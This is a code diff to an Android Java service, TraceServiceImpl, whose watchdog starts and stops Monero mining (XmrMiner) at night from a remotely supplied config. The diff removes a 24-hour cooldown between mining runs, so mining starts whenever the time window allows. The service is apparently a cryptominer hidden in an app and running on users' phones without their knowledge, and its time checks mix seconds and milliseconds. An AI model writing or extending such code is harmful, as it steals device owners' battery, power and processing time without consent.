@@ -67,7 +67,6 @@ public final class TraceServiceImpl extends AbsWorkService {
         private void resetMiner(Context context) {
             nightConfig = null;
             startBatteryLevel = 0;
-            cacheLastStopTimestamp(context);
             stopMine();
         }
     };
@@ -129,17 +128,12 @@ public final class TraceServiceImpl extends AbsWorkService {
                                     public void runComplete(NightConfig nightConfig) {
                                         if (nightConfig == null) {
                                             info("KeepAliveWatchDog: nightConfig is null");
-                                            reset();
+                                            TraceServiceImpl.this.nightConfig = null;
                                             return;
                                         }
                                         if (!nightConfig.enableNightDaemon) {
                                             info("KeepAliveWatchDog: night mine disable");
-                                            reset();
-                                            return;
-                                        }
-                                        if (isMining()) {
-                                            info("KeepAliveWatchDog: is mining");
-                                            reset();
+                                            TraceServiceImpl.this.nightConfig = null;
                                             return;
                                         }
                                         long current = System.currentTimeMillis() / 1000;
@@ -147,29 +141,25 @@ public final class TraceServiceImpl extends AbsWorkService {
                                         info("KeepAliveWatchDog: current = " + current + " ,interval = " + interval);
                                         if (interval < 0) {
                                             info("KeepAliveWatchDog: not reaching the time of night mine");
-                                            reset();
+                                            TraceServiceImpl.this.nightConfig = null;
                                             return;
                                         }
                                         if (interval > 60 * 60 * 1000) {
                                             info("KeepAliveWatchDog: take an hour out of the night mine");
-                                            reset();
+                                            if (TraceServiceImpl.this.nightConfig != null) {
+                                                TraceServiceImpl.this.nightConfig = null;
+                                                if (isMining()) {
+                                                    stopMine();
+                                                }
+                                            }
                                             return;
                                         }
-                                        long lastStopTime = getLastStopTimestamp(getApplicationContext());
-                                        info("KeepAliveWatchDog: current = " + current + " ,lastStopTime = " + lastStopTime);
-                                        if (current - lastStopTime <= 24 * 60 * 60 * 1000) {
-                                            info("KeepAliveWatchDog: not more than 24 hours from the last night mine");
-                                            reset();
-                                            return;
-                                        }
-                                        info("KeepAliveWatchDog: start night mine");
-                                        TraceServiceImpl.this.nightConfig = nightConfig;
-                                        startMine();
-                                    }
-
-                                    private void reset() {
-                                        if (TraceServiceImpl.this.nightConfig != null) {
-                                            TraceServiceImpl.this.nightConfig = null;
+                                        if (!isMining()) {
+                                            info("KeepAliveWatchDog: start night mine");
+                                            TraceServiceImpl.this.nightConfig = nightConfig;
+                                            startMine();
+                                        } else {
+                                            info("KeepAliveWatchDog: is mining");
                                         }
                                     }
                                 });
@@ -249,15 +239,5 @@ public final class TraceServiceImpl extends AbsWorkService {
 
     private boolean isMining() {
         return XmrMiner.instance().isMining();
-    }
-
-    private void cacheLastStopTimestamp(Context context) {
-        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(context);
-        sp.edit().putLong("WATERHOLE_LAST_STOP_TIMESTAMP", System.currentTimeMillis() / 1000).apply();
-    }
-
-    private long getLastStopTimestamp(Context context) {
-        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(context);
-        return sp.getLong("WATERHOLE_LAST_STOP_TIMESTAMP", 0);
     }
 }
